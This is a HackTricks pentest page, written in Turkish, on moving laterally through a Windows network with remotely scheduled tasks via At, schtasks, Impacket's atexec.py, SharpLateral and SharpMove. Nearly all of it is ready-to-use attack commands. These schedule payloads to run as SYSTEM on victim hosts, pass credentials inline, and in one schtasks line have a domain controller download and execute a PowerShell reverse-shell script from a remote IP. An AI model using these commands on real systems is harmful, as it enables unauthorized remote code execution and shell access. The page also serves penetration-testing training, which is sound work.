# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl Çalışır

At, kullanıcı adı/(şifre/Hash) bildiğiniz hostlarda görevleri planlamanıza olanak tanır. Bu nedenle, diğer hostlarda komutlar çalıştırmak ve çıktıyı almak için bunu kullanabilirsiniz.
```
At \\victim 11:00:00PM shutdown -r
```
schtasks kullanarak önce görevi oluşturmanız ve ardından çağırmanız gerekir:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
**Impacket'in `atexec.py`** dosyasını, AT komutunu kullanarak uzak sistemlerde komutlar çalıştırmak için kullanabilirsiniz. Bu, hedef sistem için geçerli kimlik bilgileri (kullanıcı adı ve şifre veya hash) gerektirir.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Ayrıca [SharpLateral](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[SharpMove](https://github.com/0xthirteen/SharpMove) kullanabilirsiniz:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Daha fazla bilgi için [**schtasks'in silver ticket'larla kullanımı burada**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
